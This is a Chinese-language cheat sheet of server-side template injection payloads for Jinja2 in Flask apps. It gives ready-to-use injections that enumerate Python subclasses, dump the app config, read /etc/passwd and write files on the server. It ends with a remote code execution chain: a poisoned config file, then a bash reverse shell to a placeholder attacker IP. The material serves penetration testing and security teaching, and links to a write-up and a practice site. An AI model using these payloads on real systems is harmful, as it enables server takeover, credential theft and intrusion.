# 模板注入

模板注入允许攻击者将模板代码包含到一个存在(或不存在)的模板中.

## Jinja2
[官方网址](http://jinja.pocoo.org/)
> Jinja2是Python的一个完整的模板引擎. 它有完全的unicode支持,一个可选的集成沙盒执行环境,广泛使用以及BSD许可.

Jinja2是由Python的Web框架使用的，比如Django或Flask.
上面的注入已经在Flask应用中进行了测试.
#### 模板格式
```
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}

```

#### 转储所有使用类
```
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

#### 转储所有配置变量
```python
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```

#### 读取远程文件
```
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }} 
```

#### 写入远程文件
```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```

#### 通过反向shell执行远程代码
监听连接
```
nv -lnvp 8000
```
注入这个模板
```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} # evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  # load the evil config
{{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }} # connect to evil host
```

#### 资源
[https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)

#### 练习
[https://w3challs.com/](https://w3challs.com/)
